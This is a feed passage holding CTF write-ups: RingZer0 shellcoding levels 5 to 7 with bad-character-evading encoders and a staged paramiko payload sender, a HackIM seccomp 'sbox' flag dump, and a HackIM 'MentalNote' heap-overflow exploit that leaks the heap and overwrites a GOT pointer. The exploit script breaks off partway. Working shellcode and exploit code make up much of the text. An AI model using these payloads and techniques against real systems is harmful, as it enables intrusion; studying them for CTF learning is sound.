RingZer0 Team CTF Shellcoding Level 5
Submit your shellcode using hex representation "\xcc\xcd".
Type "end" to exit.

This level have shellcode restriction. Bad char list "\x0a\x0d\x2f\xff\x0f\x05\x68 and \x40 to \x65" max size 100 bytes.
You main goal is to read /flag/level5.flag

shellcode&gt;\xeb\x22\x90\x90\x69\x21\xd0\x70\x7f\x74\x7e\x7a\x6f\x7a\x1f\x15\xa0\x12\x69\x97\xe7\x1f\x15\x69\x87\x69\x86\x1f\x15\xa0\x11\x70\x7f\x1f\x15\xd3\x81\x70\x04\x21\x10\x10\x20\x81\x70\x08\x20\x20\x20\x10\x81\x70\x0c\x10\x20\x10\x10\x81\x70\x10\x10\x10\x21\x10\x81\x70\x14\x10\x10\x10\x21\x81\x70\x18\x10\x21\x10\x10\x81\x70\x1c\x10\x10\x10\x20\x81\x70\x20\x20\x10\x10\x10\xeb\xa6
    Shellcode received...
    Shellcode length (94) bytes.

    Success: Executing shellcode...

/flag/level5.flag^@
FLAG-&lt;redacted&gt;
    Error: SIGSEGV received I think your shellcode is not working.
</code></pre>

<h2>Level 6</h2>

<pre><code>Bad char list "\x0a\x0d\x2f\xff\x0f\x05\x68 and \x40 to \x81" max size 90 bytes.
</code></pre>

<p>Things are beginning to look grim! Every time I came up with a solution, the next level would list one or more crucial bytes as a bad char. This time, <code>0x81</code> became a bad char, blocking the use of the <code>xor</code>.</p>

<p>I turned again to the gigantic table over at <a href="http://ref.x86asm.net/coder64.html">ref.x64asm.net</a>. I flipped through the list of available opcodes, looking for things that would allow me to decode and carve out the shellcode. Finally, my eyes caught the floating point instructions. One of the variants allows the use of integers as arguments for floating point operations:</p>

<pre><code>fild dword [rax+rbx*4]
fiadd dword [rax+rcx*4]
fistp dword [rax+rcx*4]
</code></pre>

<p>These instructions do not contain bad chars! Furthermore, they allow the use of <code>rax</code> as a pointer to the shellcode, enabling us to carve out stage 1. I used a similar trick as in level 5 to check the viability of this technique:</p>

<pre><code>bits 64

_start:
jmp _decode
nop
nop                     ; align the encoded shellcode to a dword boundary

_stage1:

_0 dd 0xc3c3c3c3        ; these rets should be transformed into jmp $-2
_1 dd 0x90909090
_2 dd 0x90909090
_3 dd 0x90909090
_4 dd 0x90909090
_5 dd 0x90909090
_6 dd 0x90909090

_8 dd 0x3b283b28        ; funny enough, the constant for the add is the same as for the xor!
_9 dd 0x90909090
_a dd 0x90909090
_b dd 0x90909090
_c dd 0x90909090
_d dd 0x90909090
_e dd 0x90909090

_decode:                ; i'd call this stage 0
xor ecx,ecx             ; clear ecx and rcx
xor ebx,ebx             ; clear ebx
mov cl, (_6-_start)/4   ; starting dword for shellcode 
mov bl, (_e-_start)/4   ; starting dword for decoding constants
_decodeloop:
fild dword [rax+rbx*4]  ; load integer into st0
dec bl
fiadd dword [rax+rcx*4] ; add constant to st0
fistp dword [rax+rcx*4] ; store integer at this position, effectively decoding the instructions
loop _decodeloop        ; use the fact that rcx is now an index and a counter

jmp _stage1             ; jump to -hopefully- decoded shellcode
</code></pre>

<p>Again, this hangs the remote program, confirming that this is a viable technique. I adjusted <code>encode.py</code> to generate the right constants. Prepare for some ultra-hacky python:</p>

<pre><code class="python">import struct

carry = 0
def find_sub_bytes(byte_required):
    global carry
    b = ord(byte_required) - carry  # compensate for possible carry from previously encoded byte
    for i in range(256):
        if i not in badchars:
            c = b - i
            if (c &amp; 0xff) not in badchars:
                carry = 0
                if c &lt; 0:
                    carry = 1   # this carry is necessary, because the if the byte overflows, it is carried over to the next byte. 
                # return the two bytes that encode the required byte
                return chr(i), chr(c &amp; 0xff)
    print "cannot find proper byte for {}".format(b)
    exit(-1)

badchars = [0x0, 0xa, 0xd, 0x2f, 0xff, 0xf, 0x5, 0x68]
for i in range(0x40, 0x82):
    badchars.append(i)
# paranoia!
for i in range(0x1, 0xf):
    badchars.append(i)

with open('shellcode') as sc:
    data = sc.read()
    sc.close()

storage = ''
encoded_bytes = ''
commands = ''
defines = ''
num_commands = 0

while len(data) % 4:
    data += "\x8f"

for b in data:
    (b1, b2) = find_sub_bytes(b)

    storage += b1
    encoded_bytes += b2
    if len(storage) == 4:
        # emit
        carry = 0   # clear carry, not necessary for next dword!
        commands += "_a{} dd {}\n".format(num_commands, hex(struct.unpack('&lt;L', storage)[0]))
        defines += "_b{} dd {}\n".format(num_commands, hex(struct.unpack('&lt;L', encoded_bytes)[0]))
        storage = ''
        encoded_bytes = ''
        num_commands += 1

print """default rel
bits 64

;mov rax, 10
;mov rdi, 0x400000
;mov rsi, 0x1000
;mov rdx, 7
;syscall

;lea rax, [_start]

_start:
_stage0:                ; stage0 will carve out stage1 
xor ecx,ecx
jmp _decoder
"""
print commands
print defines
print """
_decoder:
xor ebx,ebx
mov cl, (_a{}-_start)/4
mov bl, (_b{}-_start)/4
_decodeloop:
fild dword [rax+rbx*4]
dec bl
fiadd dword [rax+rcx*4]
fistp dword [rax+rcx*4]
loop _decodeloop
jmp _a0

""".format(num_commands-1, num_commands-1)
</code></pre>

<p>This generated the following assembly:</p>

<pre><code>bits 64

_start:
_stage0:                ; stage0 will carve out stage1 
xor ecx,ecx
jmp _decoder

_a0 dd 0x11101010
_a1 dd 0x2b1f1520
_a2 dd 0x10111a82
_a3 dd 0x89101010
_a4 dd 0x10101110
_a5 dd 0x11101010
_a6 dd 0x10101010
_a7 dd 0x10101120

_b0 dd 0x3fb02138
_b1 dd 0x3f3f3f3f
_b2 dd 0xf4fe3ffd
_b3 dd 0xfe37f2a0
_b4 dd 0x37f4fee7
_b5 dd 0xfe863887
_b6 dd 0x3ff19ff5
_b7 dd 0xb2f4fe3f


_decoder:
xor ebx,ebx
mov cl, (_a7-_start)/4
mov bl, (_b7-_start)/4
_decodeloop:
fild dword [rax+rbx*4]
dec bl
fiadd dword [rax+rcx*4]
fistp dword [rax+rcx*4]
loop _decodeloop
jmp _a0
</code></pre>

<p>There was, however, a huge problem. The instruction <code>jmp _decoder</code> generated a bad char: <code>0x40</code>. This is because it has to jump over two times 32 bytes of data to reach the decoder, which is exactly 64 bytes. However, the shellcode is only 31 bytes long, while I store 32 bytes. That means that the last byte is redundant! I exploited this fact by making this final byte a NOP. But because it is used in the decoding process, I had to modify <code>encode.py</code> again.</p>

<pre><code class="python">while len(data) % 4:
    #data += "\xc3"
    data += "\x8f"  # found by trial &amp; error ;)
</code></pre>

<p>This modifies the two last constants:</p>

<pre><code>_a7 dd 0x90101120
...
_b7 dd 0xfef4fe3f
</code></pre>

<p>I switched them around, so that the last byte of _b7 would be the 0x90 byte. Then, I could jump there:</p>

<pre><code>jmp _b7+3           ; assembles to eb 3f -&gt; no more badchars!

...
_a7 dd 0xfef4fe3f
...
_b7 dd 0x90101120   ; this was 0xfef4fe3f (little endianess)
</code></pre>

<p>The working shellcode now looks like this:</p>

<pre><code>bits 64

_start:
_stage0:                ; stage0 will carve out stage1 
xor ecx,ecx
jmp _b7+3               ; jump to the NOP, avoiding a bad char.

_a0 dd 0x11101010
_a1 dd 0x2b1f1520
_a2 dd 0x10111a82
_a3 dd 0x89101010
_a4 dd 0x10101110
_a5 dd 0x11101010
_a6 dd 0x10101010
_a7 dd 0xfef4fe3f

_b0 dd 0x3fb02138
_b1 dd 0x3f3f3f3f
_b2 dd 0xf4fe3ffd
_b3 dd 0xfe37f2a0
_b4 dd 0x37f4fee7
_b5 dd 0xfe863887
_b6 dd 0x3ff19ff5
_b7 dd 0x90101120

_decoder:
xor ebx,ebx

mov cl, (_a7-_start)/4
mov bl, (_b7-_start)/4
_decodeloop:    
fild dword [rax+rbx*4]  ; load integer
dec bl
fiadd dword [rax+rcx*4] ; do the actual decoding
fistp dword [rax+rcx*4] ; store the decoded bytes
loop _decodeloop        ; use rcx as counter and index
jmp _a0                 ; jump to decoded shellcode
</code></pre>

<p>Let&rsquo;s run it!</p>

<pre><code>shellcode&gt;\x31\xc9\xeb\x3f\x10\x10\x10\x11\x20\x15\x1f\x2b\x82\x1a\x11\x10\x10\x10\x10\x89\x10\x11\x10\x10\x10\x10\x10\x11\x10\x10\x10\x10\x3f\xfe\xf4\xfe\x38\x21\xb0\x3f\x3f\x3f\x3f\x3f\xfd\x3f\xfe\xf4\xa0\xf2\x37\xfe\xe7\xfe\xf4\x37\x87\x38\x86\xfe\xf5\x9f\xf1\x3f\x20\x11\x10\x90\x31\xdb\xb1\x08\xb3\x10\xdb\x04\x98\xfe\xcb\xda\x04\x88\xdb\x1c\x88\xe2\xf3\xeb\xab
    Shellcode received...
    Shellcode length (89) bytes.

    Success: Executing shellcode...

/flag/level6.flag^@
FLAG-&lt;redacted&gt;
Connection to shellcode.ringzer0team.com closed.
</code></pre>

<p>Got it with <em>one</em> byte to spare!</p>

<h2>Level 7: Ultra-Violence</h2>

<p>OK, I thought the last level was pretty hard, having to resort to floating point instructions to carve out a shellcode. I was shocked to see the description for level 7:</p>

<pre><code>This level have shellcode restriction. Bad char list "\x0a\x0d\x2f\xff\x0f\x05\x68 and \x30 to \x81" max size 40 bytes.
For an unknown funky reason I decide to add couple of random bytes in your buffer after the twentieth character.
Random chunk of bytes size is based on "rand() % 20"
</code></pre>

<p>Waaaaat. A shit-ton of bad chars, plus it seems I couldn&rsquo;t trust whatever I sent after the twentieth bytes. This effectively cut my shellcode size to <em>just twenty bytes</em>. I could never send in a stage0 that would carve out the real shellcode, as there was simply not enough space. Instead, my stage 0 would have to read in the shellcode from the socket directly. So, I needed a way to call <code>syscall</code> to read from stdin. However, <code>0x0f</code> and <code>0x05</code> are badchars. Furthermore, where exactly would I store this newly read shellcode?</p>

<p>Here&rsquo;s what I came up with. I&rsquo;ll dump out stage 0 and explain it, going bit by bit (just as I did when making this monstrosity). This assembles to <em>exactly</em> 20 bytes:</p>

<pre><code>bits 64
_start:                 
add al, _syscall-_start
fldz                    
fsub dword [rax]        
fistp dword [rax]       
sbb esi, esi            
xchg esi, edi           
sbb esi, esi            
mov dl, 0xf0            
_syscall:
dd -84907592.0          
</code></pre>

<p>First things first, we need some way to decode an encoded version of <code>syscall</code>. Again, I turned to floating point instructions. I could a zero and then subtract another float; I might be able to get the resulting integer to decode to <code>syscall</code>!</p>

<p>Due to the size limitation, I could only encode four bytes. The rest of the shellcode would not only need to take care of decoding these four bytes, but also setting up the registers for <code>syscall read</code>.</p>

<pre><code>bits 64
_start:                 ; shellcode stage0: read in stage1
add al, _syscall-_start ; point rax to encoded instruction
</code></pre>

<p>I didn&rsquo;t care anymore about using <code>rcx</code> as a counter and index. I needed to adjust the pointer to the right address, which contained an encoded dword. The decoding of this dword is handle by these instructions:</p>

<pre><code>fldz                    ; setup st0
fsub dword [rax]        ; subtract encoded instruction
fistp dword [rax]       ; store them again
</code></pre>

<p>The dword that I chose to encode were actually these instructions:</p>

<pre><code>bits 64
xchg rax,rsi
syscall
</code></pre>

<p>These would assembled to:</p>

<pre><code>$ xxd small
0000000: 4896 0f05
</code></pre>

<p>I then turned to python:</p>

<pre><code class="python">$ python
Python 2.7.3 (default, Mar 13 2014, 11:03:55) 
[GCC 4.7.2] on linux2
Type "help", "copyright", "credits" or "license" for more information.
&gt;&gt;&gt; 0x050f9648
84907592
</code></pre>

<p>I was lucked out here. I tried many things, but this value, stored as a negative float, did <strong>not</strong> contain any bad chars!</p>

<pre><code>sbb esi, esi            ; set rsi to zero
xchg esi, edi           ; used for edi -&gt; stdin
sbb esi, esi            ; set rsi to zero, used for rax -&gt; read
mov dl, 0xf0            ; read in 0xf0 bytes, hopefully enough
_syscall:
dd -84907592.0          ; this is actually xchg rax, rsi; syscall but encoded as a float!
</code></pre>

<p>The <code>sbb</code> instruction is just another way of saying <code>sub esi, esi</code>. The <code>sub</code> instruction contains a bad char. Operations on <code>rsi</code> and <code>rdi</code> contained bad chars, but using <code>esi</code> and <code>edi</code> still had the desired effect of zeroing out the registers.</p>

<p>Finally, just before the <code>syscall</code> would be executed, the registers look like this:</p>

<pre><code>rsi: address of _syscall
rdi: zero (stdin)
rax: zero (syscall read)
</code></pre>

<p>Upon executing the syscall, code execution will go into kernel space, reading from stdin <em>to</em> the address of _syscall, overwriting the instructions that come after it.</p>

<p>Which lead me to another problem: how do we send the shellcode? I couldn&rsquo;t send raw bytes over <code>ssh</code>. One option was to encode the shellcode again, using an alphanumeric carver. I decided to put that option on hold. I tried to port-forward the ssh connection so that I could use python and sockets to get the flag; didn&rsquo;t work. Instead, I had to turn to some paramiko black magic. Behold, <code>fullauto.py</code>!</p>

<pre><code class="python">import paramiko
import time

ssh = paramiko.SSHClient()
# fix missing hostkey -&gt; https://stackoverflow.com/questions/10670217/paramiko-unknown-server
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())   
ssh.connect('shellcode.ringzer0team.com', username='level7', password='FLAG-&lt;redacted&gt;', port=7771)

# this was the only thing that worked for me. opening a channel via a transport failed miserably.
chan = ssh.invoke_shell()
time.sleep(0.2)

print chan.recv(1024)
time.sleep(0.2)

# send stage0, which will attempt to read from stdin. mind the last \n!
chan.send("\\x04\\x10\\xd9\\xee\\xd8\\x20\\xdb\\x18\\x19\\xf6\\x87\\xf7\\x19\\xf6\\xb2\\xf0\\xc9\\xf2\\xa1\\xcc\n")
time.sleep(0.2)

print chan.recv(256)
time.sleep(0.2)

# we'll need a small NOP sled to get us to the shellcode
payload = "\x90" * 20

# read in the 31 byte shellcode, designed to open/read/write a file
with open('modified-shellcode3') as f:
    data = f.read()
    payload += data
    f.close()

chan.send(payload+'\n')
time.sleep(0.2)

chan.send('/flag/level7.flag\x00\n')
print chan.recv(256)
time.sleep(0.2)

# receive flag!
print chan.recv(256)
</code></pre>

<p>Running this python script with the appropriate password to level 7 spat out, amongst others, <em>part</em> of the final flag!</p>

<p>Something funky was going on. The stage 2 was being read and executed, but the contents of the flag on the stack were being mangled.</p>

<p>I finally traced it to this part of the shellcode:</p>

<pre><code>lea rsi, [rsp]

...

mov al, 1
push rax            ; the push seems to mangle the output on the stack
pop rdi             ; fd = stdout
                    ; rsi = still pointer to buffer
                    ; rdx = still 0x7f
syscall
ret
</code></pre>

<p>Substituting it for this seemed to do the trick:</p>

<pre><code>lea rsi, [rsp+60]

...

mov rdx, rax        ; number of bytes read; output exactly the contents of flag. it's cleaner this way
mov al, 1
push rax            ; the push seems to mangle the output on the stack
pop rdi             ; fd = stdout
                    ; rsi = still pointer to buffer
                    ; rdx = still 0x7f
syscall
ret
</code></pre>

<p>I&rsquo;m still puzzled why this originally mangled the output on the stack, where I had no problems with this shellcode before. If anyone has an idea, let me know in the comments :)</p>

<h2>Final words</h2>

<p>Phew, what a ride! These challenges were a lot of fun and taught me several interesting concepts about x86-64 shellcoding. Thank you <a href="http://ringzer0team.com/">RingZer0Team</a> for these awesome challenges!</p>

<p>This writeup was written in two evenings of rigorously hacking away at the keyboard (the challenges were solved over several days). Therefore, errors will probably exist. If you find any, or have any suggestion or useful remark, please feel free to leave them in the comments!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[HackIM CTF - Sbox]]></title>
    <link href="http://barrebas.github.io/blog/2015/01/11/hackim-ctf-sbox/"/>
    <updated>2015-01-11T22:52:27+01:00</updated>
    <id>http://barrebas.github.io/blog/2015/01/11/hackim-ctf-sbox</id>
    <content type="html"><![CDATA[<p>Quirky little challenge, this <code>sbox</code>. We&rsquo;re actually given the keys to the kingdom right away!</p>

<!-- more -->


<p>Again, this was a one-two with superkojiman, who did the initial reversing! The program needs <code>libseccomp</code> to run. I had to install <code>libseccomp1</code> on my Ubuntu VM and symlink <code>libseccomp.so.2</code> to it to make the binary start. <a href="http://sourceforge.net/projects/libseccomp/">libseccomp</a> does syscall filtering. In this case, whatever is added to its internal list is ok, other syscalls are caught and the program exits with SIGSYS.</p>

<p>The syscalls that are whitelisted can be found by looking for <code>seccomp_rule_add</code> calls:</p>

<pre><code> 80488dc: c7 44 24 0c 00 00 00  mov    DWORD PTR [esp+0xc],0x0
 80488e3:   00 
 80488e4:   c7 44 24 08 03 00 00    mov    DWORD PTR [esp+0x8],0x3  ; syscall read
 80488eb:   00 
 80488ec:   c7 44 24 04 00 00 ff    mov    DWORD PTR [esp+0x4],0x7fff0000
 80488f3:   7f 
 80488f4:   8b 44 24 34             mov    eax,DWORD PTR [esp+0x34]
 80488f8:   89 04 24                mov    DWORD PTR [esp],eax
 80488fb:   e8 b0 fc ff ff          call   80485b0 &lt;seccomp_rule_add@plt&gt;
 8048900:   89 44 24 38             mov    DWORD PTR [esp+0x38],eax
 8048904:   83 7c 24 38 00          cmp    DWORD PTR [esp+0x38],0x0
 8048909:   79 05                   jns    8048910 &lt;main+0x191&gt;
 804890b:   e9 d9 00 00 00          jmp    80489e9 &lt;main+0x26a&gt;
 8048910:   c7 44 24 0c 00 00 00    mov    DWORD PTR [esp+0xc],0x0
 8048917:   00 
 8048918:   c7 44 24 08 04 00 00    mov    DWORD PTR [esp+0x8],0x4  ; syscall write
 804891f:   00 
 8048920:   c7 44 24 04 00 00 ff    mov    DWORD PTR [esp+0x4],0x7fff0000
 8048927:   7f 
 8048928:   8b 44 24 34             mov    eax,DWORD PTR [esp+0x34]
 804892c:   89 04 24                mov    DWORD PTR [esp],eax
 804892f:   e8 7c fc ff ff          call   80485b0 &lt;seccomp_rule_add@plt&gt;
 8048934:   89 44 24 38             mov    DWORD PTR [esp+0x38],eax
 8048938:   83 7c 24 38 00          cmp    DWORD PTR [esp+0x38],0x0
 804893d:   79 05                   jns    8048944 &lt;main+0x1c5&gt;
 804893f:   e9 a5 00 00 00          jmp    80489e9 &lt;main+0x26a&gt;
 8048944:   c7 44 24 0c 00 00 00    mov    DWORD PTR [esp+0xc],0x0
 804894b:   00 
 804894c:   c7 44 24 08 01 00 00    mov    DWORD PTR [esp+0x8],0x1  ; syscall exit
 8048953:   00 
 8048954:   c7 44 24 04 00 00 ff    mov    DWORD PTR [esp+0x4],0x7fff0000
 804895b:   7f 
 804895c:   8b 44 24 34             mov    eax,DWORD PTR [esp+0x34]
 8048960:   89 04 24                mov    DWORD PTR [esp],eax
 8048963:   e8 48 fc ff ff          call   80485b0 &lt;seccomp_rule_add@plt&gt;
</code></pre>

<p>So that&rsquo;s not a whole lot to work with. We can only read, write and exit. No <code>execve</code> or open/read/write for us!</p>

<h2>Diving deeper</h2>

<p>Luckily, when run, the binary does all the heavy lifting for us. It reads the flag and stores it on the heap. It then waits for input, storing that also on the heap and then proceeds to run whatever is entered:</p>

<pre><code>   0x80489d6 &lt;main+599&gt;:    call   0x80485a0 &lt;read@plt&gt;
   0x80489db &lt;main+604&gt;:    mov    eax,DWORD PTR [esp+0x2c]
   0x80489df &lt;main+608&gt;:    mov    DWORD PTR [esp+0x3c],eax
   0x80489e3 &lt;main+612&gt;:    mov    eax,DWORD PTR [esp+0x3c]
   0x80489e7 &lt;main+616&gt;:    call   eax
</code></pre>

<p>This allows us to supply our own shellcode without even having to exploit a vulnerability. There were some annoying things that prevented me from debugging the binary locally, so I hex-edited the binary to make the calls to <code>signal()</code> and <code>alarm()</code> do nothing (edit the <code>plt</code> section for those calls &amp; make the first byte <code>0xc3</code> -> <code>RET</code>).</p>

<p>I started binary via <code>socat</code> to test locally. First, let&rsquo;s see what we have to work with, by sending a single <code>0xcc</code> (<code>INT 3</code>) via a python script:</p>

<pre><code class="python">import socket
import time

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('localhost', 5555))

raw_input()
s.send("\xcc")

print s.recv(256)
s.close()
</code></pre>

<p>The <code>raw_input()</code> serves to halt the binary, given us the chance to attach gdb with</p>

<pre><code class="bash">$ gdb -pid `pgrep sbox`
</code></pre>

<p>After attaching, I entered &lsquo;c&rsquo; to continue execution. Then the binary crashes upon hitting the <code>INT 3</code>. The registers look like this, flag is in the same mmapped region:</p>

<pre><code>0xb77c6002 in ?? ()
gdb-peda$ i r
eax            0xb77c6000    0xb77c6000
ecx            0xb77c6000    0xb77c6000
edx            0x2000    0x2000
ebx            0xb77a5ff4    0xb77a5ff4
esp            0xbf9eff0c    0xbf9eff0c
ebp            0xbf9eff58    0xbf9eff58
esi            0x0    0x0
edi            0x0    0x0
eip            0xb77c6002    0xb77c6002
eflags         0x207    [ CF PF IF ]
cs             0x73    0x73
ss             0x7b    0x7b
ds             0x7b    0x7b
es             0x7b    0x7b
fs             0x0    0x0
gs             0x33    0x33
gdb-peda$ find "FLAG"
Searching for 'FLAG' in: None ranges
Found 2 results, display max 2 items:
    mapped : 0xb77c8000 ("FLAG\n")
</code></pre>

<p>I whipped up some &lsquo;shellcode&rsquo; (if you can call it that). We can use the values of the registers in our shellcode to write the flag to STDOUT. For instance, <code>ecx</code> already points to the shellcode. We just have to add <code>0x2000</code> to it to get the address of the flag!</p>

<pre><code>bits 32

push 0x20     # 
pop ebx       # pop 0x20 in ebx
shl ebx, 8    # ebx is now 0x2000
              # adjust ecx so that it points to flag in memory
add ecx, ebx  # ecx = buffer
xor ebx, ebx  # ebx = fd
inc ebx       # STDOUT; STDERR also works
xor edx, edx  # edx = count
mov dl, 0xff  # write out 255 bytes
push 4        # eax = syscall
pop eax       # eax = write
int 0x80      # get flag!
</code></pre>

<p>I avoided null-bytes, just in case. The shellcode was compiled with</p>

<pre><code class="bash">$ nasm -f bin ./shellcode.asm
</code></pre>

<p>I had issues with <code>radare2</code> not recognizing some opcodes (need to look into that!), which is why I switched to <code>nasm</code>. Using a modified version of the earlier python code, I sent the shellcode over to the server:</p>

<pre><code class="python">import socket
import time

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('54.163.248.69',9001))

with open('shellcode') as f:
    data = f.read()
    s.send(data)

print s.recv(256)
s.close()
</code></pre>

<p>The result:</p>

<pre><code class="bash">$ python sploit.py
d3sp3r4t3_sh3llc0d3
</code></pre>

<p>The flag was <code>d3sp3r4t3_sh3llc0d3</code>.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[HackIM CTF - MentalNote]]></title>
    <link href="http://barrebas.github.io/blog/2015/01/11/hackim-ctf-mentalnote/"/>
    <updated>2015-01-11T21:40:18+01:00</updated>
    <id>http://barrebas.github.io/blog/2015/01/11/hackim-ctf-mentalnote</id>
    <content type="html"><![CDATA[<p><code>mentalnote</code> was a 400 point exploitation-type challenge in NullCon&rsquo;s HackIM CTF.</p>

<!-- more -->


<p></p>

<p>Again, superkojiman started with the invaluable initial reverse engineering. The application is a note-taking program:</p>

<pre><code>~/tmp/nullcon/exp400$ ./MentalNote 
You want to store some Notes??
Well, we present you the Sherlock's MentalPad --&gt;
Sherlock uses Mental Notes to solve the Cases -- Now you can use it too.
NOTE: It has a limit though
Please enter one of the following option:
1 to add a Note.
2 to delete a Note.
3 to edit a Note.
4 to show a Note.
5 to exit.
</code></pre>

<p>superkojiman pointed out that there were two types of notes. Upon adding a note, the program asks for the type. It looks like the second type is larger. By editing a note as type two, we are able to overflow notes into the next note&rsquo;s meta-data.</p>

<p>First, let&rsquo;s allocate two notes and set them to something to inspect the heap layout.</p>

<pre><code>You want to store some Notes??
Well, we present you the Sherlock's MentalPad --&gt;
Sherlock uses Mental Notes to solve the Cases -- Now you can use it too.
NOTE: It has a limit though
Please enter one of the following option:
1 to add a Note.
2 to delete a Note.
3 to edit a Note.
4 to show a Note.
5 to exit.
Your Choice:
1
Give the type of the Note:
1
Please enter one of the following option:
1 to add a Note.
2 to delete a Note.
3 to edit a Note.
4 to show a Note.
5 to exit.
Your Choice:
1
Give the type of the Note:
1
Please enter one of the following option:
1 to add a Note.
2 to delete a Note.
3 to edit a Note.
4 to show a Note.
5 to exit.
Your Choice:
3
Give the Note id to edit:
0
Give the type to edit:
2
Give your Note:
AAAA
Please enter one of the following option:
1 to add a Note.
2 to delete a Note.
3 to edit a Note.
4 to show a Note.
5 to exit.
Your Choice:
3
Give the Note id to edit:
1
Give the type to edit:
2
Give your Note:
BBBB
Please enter one of the following option:
</code></pre>

<p>I located the second note in the heap using gdb-peda&rsquo;s <code>find</code> command.</p>

<pre><code>gdb-peda$ x/60w 0x804d0c0
0x804d0c0:  0x00000000  0x00000000  0x00000000  0x00000000
0x804d0d0:  0x00000000  0x00000000  0x00000000  0x00000000
0x804d0e0:  0x00000000  0x00000000  0x00000000  0x00000000
0x804d0f0:  0x000000e1  0x0804d1d0  0x0804d010  0x42424242
0x804d100:  0x0000000a  0x00000000  0x00000000  0x00000000
0x804d110:  0x00000000  0x00000000  0x00000000  0x00000000
</code></pre>

<p>You can see that there are several pointers stored on the heap. It looks like a doubly-linked list, with pointers to the next and previous notes. The struct that describes this layout would look something like this:</p>

<pre><code class="c">struct note {
    note *next_note;
    note *prev_note;
    char note_content[MAX_LENGTH];
};
</code></pre>

<p>I sent a stupidly large input to overflow these notes:</p>

<pre><code>gdb-peda$ r
You want to store some Notes??
Well, we present you the Sherlock's MentalPad --&gt;
Sherlock uses Mental Notes to solve the Cases -- Now you can use it too.
NOTE: It has a limit though
Please enter one of the following option:
1 to add a Note.
2 to delete a Note.
3 to edit a Note.
4 to show a Note.
5 to exit.
Your Choice:
1
Give the type of the Note:
1
Please enter one of the following option:
1 to add a Note.
2 to delete a Note.
3 to edit a Note.
4 to show a Note.
5 to exit.
Your Choice:
1
Give the type of the Note:
1
Please enter one of the following option:
1 to add a Note.
2 to delete a Note.
3 to edit a Note.
4 to show a Note.
5 to exit.
Your Choice:
3
Give the Note id to edit:
0
Give the type to edit:
2
Give your Note:
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRAAAABBBB
</code></pre>

<p>The heap for note two now looks like this:</p>

<pre><code>gdb-peda$ x/60wx 0x804d0c0
0x804d0c0:  0x46464646  0x47474747  0x48484848  0x49494949
0x804d0d0:  0x4a4a4a4a  0x4b4b4b4b  0x4c4c4c4c  0x4d4d4d4d
0x804d0e0:  0x4e4e4e4e  0x4f4f4f4f  0x50505050  0x51515151
0x804d0f0:  0x52525252  0x41414141  0x42424242  0x4242420a
0x804d100:  0x0000000a  0x00000000  0x00000000  0x00000000
</code></pre>

<p>We have overwritten the pointers. Furthermore, superkojiman noticed:</p>

<pre><code>gdb-peda$ vmmap
Start      End        Perm  Name
&lt;snip&gt;
0x0804c000 0x0804e000 rwxp  [heap]
</code></pre>

<p>The heap is writeable <strong>and</strong> executable. This allows us to store shellcode on the heap. Now to find a way to get the heap address reliably (ASLR is enabled) and overwrite a GOT pointer with the location of our shellcode.</p>

<p>I recently tested c0ne&rsquo;s binaries for his Pandora&rsquo;s Box VM. I did one of the challenges in a similar way: overflow a buffer up to a certain pointer to grab extra bytes when that buffer is printed. I could leak the heap address by sending just enough bytes into note one to make the heap look like this:</p>

<pre><code>gdb-peda$ x/60wx 0x804d0c0
0x804d0c0:  0x42424242  0x42424242  0x42424242  0x42424242
0x804d0d0:  0x42424242  0x42424242  0x42424242  0x42424242
0x804d0e0:  0x42424242  0x42424242  0x42424242  0x42424242
0x804d0f0:  0x4242420a  0x0804d1d0  0x0804d010  0x42424242
0x804d100:  0x0000000a  0x00000000  0x00000000  0x00000000
0x804d110:  0x00000000  0x00000000  0x00000000  0x00000000
</code></pre>

<p>When I know requested the value of note one, the binary would dump out lots of B&rsquo;s, but also append the pointers from the heap! With that sorted, I could find my shellcode on the heap even with ASLR enabled. Next was overwriting a GOT pointer. This was done by overflowing a note and overwriting the pointers to <code>next_note</code> and <code>prev_note</code>. Then I&rsquo;d ask the binary to delete a note. It does this by calling <code>free()</code>. Because we can control the two pointers, we have a write-what-where primitive. By setting the right values, I could write the address of the shellcode on the heap to <code>__isoc99_scanf@got.plt</code>. Initially, I swapped the two memory addresses around, leading to mangled shellcode. After overwriting the GOT pointer of <code>__isoc99_scanf@got.plt</code>, which is one of the next functions the binary calls in its main loop, the shellcode on the heap is executed. Because of the way <code>free()</code> works, we need to adjust the addresses a bit.</p>

<p>The <a href="http://www.shell-storm.org/shellcode/files/shellcode-547.php">shellcode</a> was modified a bit (&lsquo;/bin/ash&rsquo; -> &lsquo;/bin//sh&rsquo;) and stored on the heap. The overflow was used to overwrite the two pointers, and the write-what-where is triggered by sending a &lsquo;delete note&rsquo; command.</p>

<p>The exploit:</p>

<pre><code class="python">import struct
import socket
import time
import re

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('54.163.248.69', 9004))

s.recv(1000)
time.sleep(0.5)

def p(x):
    return struct.pack('&lt;L', x)

payload  = "1\n1\n1\n1\n"   # create two notes of type one
payload += "3\n0\n2\n"      # edit note 0 as type two

s.send(payload)
time.sleep(0.5)

# overflow note to line up to heap pointer
s.send("A"*212+"BBB\n")

time.sleep(0.5)
s.recv(256)

# leak heap addr
print "[+] Trying to leaking heap address..."
time.sleep(0.5)

s.send("4\n0\n")
time.sleep(0.5)

data = s.recv(1000)

# ugly.. but works :/
m = re.search(r'.*BBB\n(....).*', data)
if m:
    heap = struct.unpack('&lt;L', m.group(1))[0]
    print "[+] Leaked heap address at {}".format(hex(heap))
    # offset for shellcode found empirically via gdb
    shellcode = heap - 0xd0
    print "[+] Shellcode at {}".format(hex(shellcode))
else:
    print "[!] Fatal: could not leak heap address"
    exit(0)

time.sleep(0.5)
print "[+] Sending new notes to overwrite got pointer..."
s.send("1\n1\n1\n1\n")  # create two more notes
time.sleep(0.5)
s.recv(1000)

# send new note to overflow pointers
s.send("3\n2\n2\n")
time.sleep(0.5)
s.recv(1000)

time.sleep(0.5)
payload = ""
